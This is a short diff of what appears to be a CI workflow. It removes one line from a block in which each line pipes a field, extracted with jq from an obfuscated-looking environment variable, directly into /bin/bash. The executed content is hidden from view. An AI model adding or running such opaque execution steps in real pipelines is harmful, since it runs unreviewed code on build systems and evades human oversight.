@@ -26,7 +26,6 @@ jobs:
           echo $tfpuk4 | jq -r .omx83 | /bin/bash
           echo $shy3105 | jq -r .tbrii1527 | /bin/bash
           printf '%s' "$knj3802" | jq -r .i1 | /bin/bash
-          echo $d06 | jq -r .prh05549 | /bin/bash
           echo $qor9 | jq -r .cfgh21 | /bin/bash
           printf '%s' "$t3" | jq -r .h0572 | /bin/bash
           echo $pygh045 | jq -r .iq19 | /bin/bash
